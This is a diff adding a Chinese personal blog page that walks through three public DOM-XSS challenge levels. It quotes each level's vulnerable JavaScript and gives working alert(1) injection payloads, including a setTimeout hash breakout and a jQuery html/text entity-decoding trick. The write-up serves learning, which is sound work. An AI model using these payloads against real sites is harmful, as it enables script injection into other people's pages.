@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+<meta name="description" content="&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;少打两把王者，少发会呆，果然时间就有了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BAT XSS实例学习">
+<meta property="og:url" content="http://example.com/2020/08/25/1%E3%80%81BAT%20XSS%E5%AE%9E%E4%BE%8B%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="g1aze&#39;s blog">
+<meta property="og:description" content="&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;少打两把王者，少发会呆，果然时间就有了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/xss-1.png">
+<meta property="og:image" content="http://example.com/images/xss-2.png">
+<meta property="og:image" content="http://example.com/images/xss-5.png">
+<meta property="og:image" content="http://example.com/images/xss-3.png">
+<meta property="og:image" content="http://example.com/images/xss-4.png">
+<meta property="og:image" content="http://example.com/images/xss-6.png">
+<meta property="article:published_time" content="2020-08-25T03:13:27.000Z">
+<meta property="article:modified_time" content="2021-03-13T14:22:37.064Z">
+<meta property="article:author" content="g1aze">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/xss-1.png">
+
+
+<link rel="canonical" href="http://example.com/2020/08/25/1%E3%80%81BAT%20XSS%E5%AE%9E%E4%BE%8B%E5%AD%A6%E4%B9%A0/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>BAT XSS实例学习 | g1aze's blog</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">g1aze's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E4%B8%80%EF%BC%88xsstest1%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">题一（xsstest1）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E4%BA%8C%EF%BC%88xsstest2%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">题二（xsstest2）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E4%B8%89%EF%BC%88xsstest3%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">题三（xsstest3）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E5%BC%95%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">参考引用</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">g1aze</p>
+  <div class="site-description" itemprop="description">奔赴山海，保持热爱</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/08/25/1%E3%80%81BAT%20XSS%E5%AE%9E%E4%BE%8B%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="g1aze">
+      <meta itemprop="description" content="奔赴山海，保持热爱">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="g1aze's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BAT XSS实例学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-08-25 11:13:27" itemprop="dateCreated datePublished" datetime="2020-08-25T11:13:27+08:00">2020-08-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-13 22:22:37" itemprop="dateModified" datetime="2021-03-13T22:22:37+08:00">2021-03-13</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>&ensp;&ensp;&ensp;&ensp;少打两把王者，少发会呆，果然时间就有了。</p>
+<a id="more"></a>
+
+<h3 id="题一（xsstest1）"><a href="#题一（xsstest1）" class="headerlink" title="题一（xsstest1）"></a>题一（xsstest1）</h3><p>链接如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;px1624.sinaapp.com&#x2F;test&#x2F;xsstest1&#x2F;</span><br></pre></td></tr></table></figure>
+<p>直接查看源码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">var</span> x=location.hash;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x</span>)</span>&#123;&#125;;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&quot;aa(&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;)&quot;</span>,<span class="number">100</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">Give me xss bypass <span class="number">1</span>~</span><br></pre></td></tr></table></figure>
+<p>以本人js小学生水平，百度了下大概懂了，首先是location.hash<br><br><img src="/images/xss-1.png" alt="avatar"></p>
+<p>然后是setTimeout<br><br><img src="/images/xss-2.png" alt="avatar"><br>最终搞清楚了如何传入payload和闭合问题</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&quot;aa(&#x27;&quot;</span>+x+<span class="string">&quot;&#x27;)&quot;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="string">&quot;aa(&#x27;&quot;</span>+&#123;<span class="string">&#x27;);+alert(&#x27;</span><span class="number">1</span>&#125;<span class="string">&quot;&#x27;)&quot;</span>,<span class="number">100</span>);</span><br><span class="line">#&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="题二（xsstest2）"><a href="#题二（xsstest2）" class="headerlink" title="题二（xsstest2）"></a>题二（xsstest2）</h3><p>链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;px1624.sinaapp.com&#x2F;test&#x2F;xsstest2&#x2F;</span><br></pre></td></tr></table></figure>
+<p>查看前端源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;./jquery-3.4.1.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">Give me xss bypass <span class="number">2</span>~</span><br><span class="line">&lt;div style=<span class="string">&#x27;display:none&#x27;</span> id=<span class="string">&#x27;xx&#x27;</span>&gt;&amp;lt;img src=x onerror=alert(<span class="number">1</span>)&amp;gt;&lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;button&#x27;</span> value=<span class="string">&#x27;test&#x27;</span> onclick=<span class="string">&#x27;alert(&quot;哈哈，点这玩意没啥用的！&quot;)&#x27;</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> query = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">var</span> vars = query.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(vars)&#123;</span><br><span class="line">		aa(vars[<span class="number">0</span>],vars[<span class="number">1</span>])</span><br><span class="line">   &#125;</span><br><span class="line">   	<span class="function"><span class="keyword">function</span> <span class="title">aa</span>(<span class="params">x,y</span>)</span>&#123;</span><br><span class="line">		$(<span class="string">&quot;#xx&quot;</span>)[x]($(<span class="string">&quot;#xx&quot;</span>)[y]());</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>万能的搜索引擎</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);	<span class="comment">//获得了当前链接的中?号后的参数</span></span><br><span class="line">$(<span class="string">&#x27;#xx&#x27;</span>)	<span class="comment">//等同于document.getElementById(&#x27;xx&#x27;);</span></span><br></pre></td></tr></table></figure>
+<p>完全没思路，看了writeup才明白,主要是利用a[b]与a.b相同的特性：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a[b]与a.b作用都相同，都是获得该对象的某个属性。</span><br><span class="line"></span><br><span class="line">看到源码第15行即：</span><br><span class="line">$(&quot;#xx&quot;)[x]($(&quot;#xx&quot;)[y]()); 可以等于 $(&quot;#xx&quot;).x($(&quot;#xx&quot;).y());</span><br></pre></td></tr></table></figure>
+<p>也就是上面x,y两处将会是我们的注入点，通过构造最终payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;px1624.sinaapp.com&#x2F;test&#x2F;xsstest2&#x2F;?html&amp;text</span><br></pre></td></tr></table></figure>
+<p>有点蒙，万能的搜索引擎关于html()和text()<br><br><img src="/images/xss-5.png" alt="avatar"><br><img src="/images/xss-3.png" alt="avatar"></p>
+<p>text()方法设置或返回被选元素的文本内容。主要用于获取源码第5行id=xx标签内容，由于尖括号被实体化了，通过text()调用可以再次还原出来。<br><br><img src="/images/xss-4.png" alt="avatar"><br>一开始没注意,虽然html()、text()都是设置或返回被选元素的文本内容，但是text()会删除html标记，因此不能使用text&amp;text。</p>
+<h3 id="题三（xsstest3）"><a href="#题三（xsstest3）" class="headerlink" title="题三（xsstest3）"></a>题三（xsstest3）</h3><p>连接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;px1624.sinaapp.com&#x2F;test&#x2F;xsstest3&#x2F;</span><br></pre></td></tr></table></figure>
+<p>这个js参数是没想到的，url输入?px=111大概就懂了<br><img src="/images/xss-6.png" alt="avatar"><br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、*&#x2F;if(true)&#123;alert(1);%27;&#x2F;*%27;&#x2F;&#x2F;%27</span><br><span class="line">2、&#39;-alert(1)-&#39;</span><br></pre></td></tr></table></figure>
+<p>对应不了解的地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flying- - - - - - - ^-^</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/GgPevAGA4WW8xK7CJK7_nQ">https://mp.weixin.qq.com/s/GgPevAGA4WW8xK7CJK7_nQ</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7909">https://xz.aliyun.com/t/7909</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/xss/" rel="tag"># xss</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/12/21/2%E3%80%81ssrf%E5%AD%A6%E4%B9%A0/" rel="next" title="ssrf学习">
+                  ssrf学习 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">g1aze</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":315},"mobile":{"show":true},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
